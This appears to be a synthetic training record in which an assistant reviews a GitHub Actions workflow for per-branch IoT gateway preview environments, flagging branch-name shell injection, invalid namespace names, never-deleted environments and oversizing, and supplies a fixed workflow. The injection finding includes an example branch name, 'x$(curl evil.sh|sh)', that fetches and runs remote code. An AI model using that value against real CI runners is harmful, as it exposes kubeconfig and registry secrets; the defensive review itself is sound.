@@ -1,0 +1,148 @@
+id: gen-12764612-00442-review
+category: review
+language: yaml
+patterns:
+- minimize-environments
+facts:
+- F-PREVIEW-ENV
+messages:
+- role: user
+  content: |
+    ?
+
+    ```yaml
+    name: gateway-preview
+
+    on:
+      push:
+        branches-ignore: [main]
+
+    env:
+      REGISTRY: registry.example.com/iot
+
+    jobs:
+      preview:
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+
+          - uses: docker/login-action@v3
+            with:
+              registry: registry.example.com
+              username: ${{ secrets.REGISTRY_USER }}
+              password: ${{ secrets.REGISTRY_TOKEN }}
+
+          - name: Build and push gateway image
+            run: |
+              docker build -t $REGISTRY/edge-gateway:${{ github.sha }} .
+              docker push $REGISTRY/edge-gateway:${{ github.sha }}
+
+          - name: Write kubeconfig
+            run: |
+              mkdir -p ~/.kube
+              echo "${{ secrets.KUBECONFIG_B64 }}" | base64 -d > ~/.kube/config
+
+          - name: Deploy preview
+            run: |
+              helm upgrade --install gw-${{ github.ref_name }} ./deploy/chart \
+                --namespace preview-${{ github.ref_name }} --create-namespace \
+                --set image.tag=${{ github.sha }} \
+                --set gateway.replicas=3 \
+                --set broker.cluster.nodes=3 \
+                --set timescale.enabled=true \
+                --set redis.enabled=true \
+                --set simulator.enabled=true \
+                --set simulator.devices=500 \
+                --set ingress.host=${{ github.ref_name }}.preview.iot.example.com
+    ```
+- role: assistant
+  content: |
+    **Workload:** mixed (CI/CD plus per-branch preview environments for an IoT gateway)
+
+    #### [Security] Branch name is pasted into a shell script
+    - **Where:** `Deploy preview`, every `${{ github.ref_name }}`
+    - **Issue:** GitHub expands the expression before the shell runs. Git allows `$`, `(`, `)`, `;` and backticks in branch names. A branch named `x$(curl evil.sh|sh)` runs code on the runner, which holds your kubeconfig and registry token.
+    - **Fix:** do not use the branch name in commands. Use the PR number, which is always numeric (see the rewrite below).
+
+    #### [Bug] Branch names often make invalid Kubernetes names
+    - **Where:** release name, namespace and `ingress.host`
+    - **Issue:** `feature/mqtt-retry` contains a `/`, and uppercase letters are also rejected. Namespaces and DNS hosts do not allow them, so the deploy fails for many branches. Long branch names hit the 63-character limit too.
+    - **Fix:** name the environment `pr-<number>`.
+
+    #### [High] Every push creates an environment, and nothing ever deletes it
+    - **Where:** `on: push`, and no teardown step anywhere
+    - **Issue:** each new branch gets its own namespace with 3 gateway replicas, a 3-node broker, Timescale, Redis and a simulator. They stay up after the branch is merged or abandoned, so the number of running environments only grows.
+    - **Fix:** trigger on `pull_request`, and delete the namespace when the PR closes. A nightly scale-to-zero of the `preview-*` namespaces is a good second step. If the team can accept it, one shared environment for all branches is the cheapest option.
+    - **Impact:** reduces E and M, by hours of running time. In Green Metrics Tool micro-benchmarks, a preview environment idling for 60 seconds used only about 3% less CPU energy with 1 app replica and Postgres than with 3 replicas, Postgres, Redis and a worker. Idle services are cheap per minute. The real saving is environments that no longer exist.
+
+    #### [Medium] Production-like size for a preview
+    - **Where:** `gateway.replicas=3`, `broker.cluster.nodes=3`
+    - **Issue:** previews do not need production redundancy. Extra replicas and broker nodes reserve memory and node capacity for the whole lifetime of the environment.
+    - **Fix:** use 1 gateway replica and a single broker node. Clustering behavior (broker failover, load sharing between replicas) is then not covered by previews. Test it in staging.
+    - **Impact:** reduces M. Small per minute, as the measurement above shows. It matters because it packs more previews onto fewer nodes.
+
+    ```yaml
+    name: gateway-preview
+
+    on:
+      pull_request:
+        types: [opened, synchronize, reopened, closed]
+
+    env:
+      REGISTRY: registry.example.com/iot
+      PREVIEW: pr-${{ github.event.number }}
+
+    jobs:
+      deploy:
+        if: github.event.action != 'closed'
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+
+          - uses: docker/login-action@v3
+            with:
+              registry: registry.example.com
+              username: ${{ secrets.REGISTRY_USER }}
+              password: ${{ secrets.REGISTRY_TOKEN }}
+
+          - name: Build and push gateway image
+            run: |
+              docker build -t "$REGISTRY/edge-gateway:${{ github.sha }}" .
+              docker push "$REGISTRY/edge-gateway:${{ github.sha }}"
+
+          - name: Write kubeconfig
+            run: |
+              mkdir -p ~/.kube
+              echo "${{ secrets.KUBECONFIG_B64 }}" | base64 -d > ~/.kube/config
+
+          - name: Deploy preview
+            run: |
+              helm upgrade --install "gw-$PREVIEW" ./deploy/chart \
+                --namespace "preview-$PREVIEW" --create-namespace \
+                --set image.tag=${{ github.sha }} \
+                --set gateway.replicas=1 \
+                --set broker.cluster.nodes=1 \
+                --set timescale.enabled=true \
+                --set redis.enabled=true \
+                --set simulator.enabled=true \
+                --set simulator.devices=500 \
+                --set ingress.host="$PREVIEW.preview.iot.example.com"
+
+      teardown:
+        if: github.event.action == 'closed'
+        runs-on: ubuntu-latest
+        steps:
+          - name: Write kubeconfig
+            run: |
+              mkdir -p ~/.kube
+              echo "${{ secrets.KUBECONFIG_B64 }}" | base64 -d > ~/.kube/config
+
+          - name: Delete preview
+            run: kubectl delete namespace "preview-$PREVIEW" --ignore-not-found
+    ```
+
+    Previews now start only for pull requests, not for every pushed branch.
+
+    **Already good:** the image is tagged with the commit SHA, and each branch is isolated in its own namespace, so teardown is a single delete.
+verify:
+  static_only: GitHub Actions workflow, needs a cluster, registry and secrets
